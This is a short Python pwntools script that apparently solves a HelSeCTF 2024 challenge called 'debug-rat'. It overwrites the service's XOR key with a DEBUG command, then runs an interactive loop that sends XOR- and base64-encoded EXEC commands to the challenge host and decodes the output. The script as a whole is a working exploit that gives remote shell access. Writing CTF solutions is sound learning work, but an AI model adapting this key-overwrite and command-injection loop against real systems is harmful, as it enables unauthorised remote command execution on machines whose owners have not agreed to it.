from base64 import b64encode, b64decode
from pwn import *

context.log_level = 'warn'

def xor(dest, source):
    # print(f"Xoring {dest} with {source}")
    dest = bytearray(dest)
    source_length = len(source)
    for i in range(len(dest)):
        # print(f"Xoring with key (as hex): {source[i % source_length]:02X} {chr(source[i % source_length])}")
        dest[i] = source[i % source_length] ^ dest[i]
    return dest



overwriteSecret = b"X" * 0x20
builtInSecret = b"HELSECTF_IS_SO_MUCH_FUN\x00"
storedSecret = xor(overwriteSecret, builtInSecret)
command = b"ls -lah ."
command = xor(builtInSecret + command, storedSecret)

# io = process(["./debug_rat_patch"])
io = remote("helsectf2024-2da207d37b091b1b4dff-debug-rat.chals.io", 443, ssl=True)

io.recvuntil(b"> ")
io.sendline(b"DEBUG " + overwriteSecret)
io.recvuntil(b"> ")

print("Connected to RAT")
while (True):
    # Wait for user to enter command: "
    command = input("Enter command: ")
    command = command.encode()
    command = xor(builtInSecret + command, storedSecret)

    io.sendline(b"EXEC " + b64encode(command))
    io.recvuntil(b"EXEC result:\n", drop=True)
    data = io.recvuntil(b"> EXEC SUCCESS", drop=True, timeout=5)
    try:
        # Loop through all and decode:
        for data in data.split(b"\n"):
            data = b64decode(data)
            data = xor(data, storedSecret)
            print(data.decode(), end="")
    except:
        print("ERROR", data.decode())

